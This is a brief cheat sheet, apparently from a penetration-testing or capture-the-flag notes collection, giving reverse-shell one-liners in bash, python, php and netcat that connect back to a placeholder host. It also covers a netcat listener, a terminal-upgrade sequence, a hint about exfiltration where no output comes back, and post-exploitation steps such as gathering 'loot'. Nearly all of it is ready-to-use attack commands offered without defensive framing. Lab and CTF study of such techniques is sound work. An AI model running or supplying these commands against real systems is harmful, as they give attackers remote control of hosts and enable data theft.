title: Reverse Shells and Interactive TTY Upgrade
description: One-liner reverse shell reference + pseudo-terminal upgrade
detail:
bash: bash -i >& /dev/tcp/MY/PORT 0>&1
python: python3 -c 'import socket,subprocess,os;...dup2...' (classic one-liner)
php: php -r '$sock=fsockopen("MY",PORT);exec("sh <&3 >&3 2>&3");'
nc with -e: nc -e /bin/sh MY PORT; without -e use a pipe with mkfifo
Upgrade interactivity: python3 -c 'import pty;pty.spawn("/bin/bash")' → Ctrl-Z → stty raw -echo; fg → export TERM=xterm
Listener: nc -lvnp PORT
No-echo environments: write files/scheduled tasks for exfiltration; craft pure TCP errors (see the command injection entry)
Three things to do after getting a shell: id/whoami, locate sensitive proof artifacts, record a loot fact.
